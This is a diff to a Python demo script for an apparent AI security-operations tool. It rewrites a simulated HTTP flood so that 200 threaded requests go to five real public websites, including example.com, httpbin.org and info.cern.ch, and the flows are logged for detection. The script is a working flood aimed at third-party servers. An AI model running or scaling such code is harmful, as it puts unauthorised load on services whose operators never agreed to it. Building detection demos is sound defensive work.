@@ -1,34 +1,51 @@
 import threading
-import socket
 import time
 import sys
+import urllib.request
+import socket
 from pathlib import Path
+import random
 
 sys.path.insert(0, str(Path(__file__).parent.parent))
 from utils.logger import get_logger
 
 log = get_logger(__name__)
 
-def run(target_ip="93.184.215.14", target_port=80, requests=200): # example.com
+# Multiple targets to distribute the flood across real endpoints
+TARGETS = [
+    "http://example.com",
+    "http://httpbin.org/get",
+    "http://neverssl.com",
+    "http://example.org",
+    "http://info.cern.ch",
+]
+
+def run(requests_count=200):
     print("\n=======================================================")
     print("   AI-SOC Demo: HTTP DDoS Flood Attack")
     print("=======================================================\n")
-    log.warning(f"🔴 [ATTACK] Launching HTTP Flood against {target_ip}:{target_port} ({requests} requests)...")
+    log.warning(f"🔴 [ATTACK] Launching HTTP Flood ({requests_count} requests across {len(TARGETS)} targets)...")
     
-    import random
-    def send_req():
+    completed = [0]
+    failed = [0]
+    
+    def send_req(url):
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(2.0)
-                s.connect((target_ip, target_port))
-                s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-        except (socket.timeout, ConnectionRefusedError):
-            pass
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 DDoS-Sim'})
+            with urllib.request.urlopen(req, timeout=3) as resp:
+                resp.read(512)  # Read a small chunk to complete the flow
+            completed[0] += 1
+        except Exception:
+            failed[0] += 1
             
-        # Log to DB
+        # Log to DB to simulate detection
         try:
             from live_capture.database import insert_flow
             from demo.demo_live_data_generator import generate_features
+            host = url.split("//")[1].split("/")[0]
+            target_ip = socket.gethostbyname(host)
+            target_port = 80 if url.startswith("http://") else 443
+            
             insert_flow(
                 src_ip="10.0.0.15", src_port=random.randint(50000, 60000),
                 dst_ip=target_ip, dst_port=target_port,
@@ -43,16 +60,18 @@ def run(target_ip="93.184.215.14", target_port=80, requests=200): # example.com
             pass
 
     threads = []
-    for _ in range(requests):
-        t = threading.Thread(target=send_req)
+    for i in range(requests_count):
+        url = TARGETS[i % len(TARGETS)]
+        t = threading.Thread(target=send_req, args=(url,))
         threads.append(t)
         t.start()
-        time.sleep(0.005)
+        # Small stagger to avoid OS socket exhaustion but still fast enough for DDoS pattern
+        time.sleep(0.02)
 
     for t in threads:
         t.join()
         
-    log.info("✅ HTTP Flood simulation complete.")
+    log.info(f"✅ HTTP Flood complete. {completed[0]} succeeded, {failed[0]} failed.")
 
 if __name__ == "__main__":
     run()
